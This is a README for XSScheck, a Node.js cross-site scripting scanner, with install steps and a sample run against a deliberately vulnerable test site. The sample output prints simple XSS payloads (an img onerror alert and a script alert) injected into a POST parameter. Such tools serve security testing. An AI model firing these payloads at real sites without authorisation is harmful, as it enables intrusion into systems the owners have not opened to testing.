# XSScheck

XSS scanner by nodejs


## Usage

```
git clone https://github.com/vlvk/XSScheck.git
cd XSScheck
```

1. Manual
```
npm install
node xsscheck.js
```

2. Docker
```
docker build -t xsscheck .
docker run -it xsscheck
```

You can put custom payloads into 'payloads.txt' file.


## Example

```
 > node xsscheck.js
 
=======> XSScheck Power By VLVK <========

[?] Select method: [G]ET or [P]OST (G/P): P
[?] Enter URL:
[?] > http://testphp.vulnweb.com/search.php?test=query
[?] Enter Parameters:
[?] > searchFor=2&goButton=go
[?] Enter location of Payloadlist (payloads.txt)
[?] >
[?] Enter Threads of Testing (4)
[?] >
[+] Use Default payloads...
====================
Path: http://testphp.vulnweb.com/search.php?test=query
Method: Post
Parameter: searchFor
Payload: <img src="x" onerror="alert(/xss/)">
Data: searchFor=2<img src="x" onerror="alert(/xss/)">&goButton=go
====================
====================
Path: http://testphp.vulnweb.com/search.php?test=query
Method: Post
Parameter: searchFor
Payload: <script>alert(/xss/)</script>
Data: searchFor=2<script>alert(/xss/)</script>&goButton=go
====================
```


## Todo

- [x] concurrent_control
- [ ] 10&16hex_encode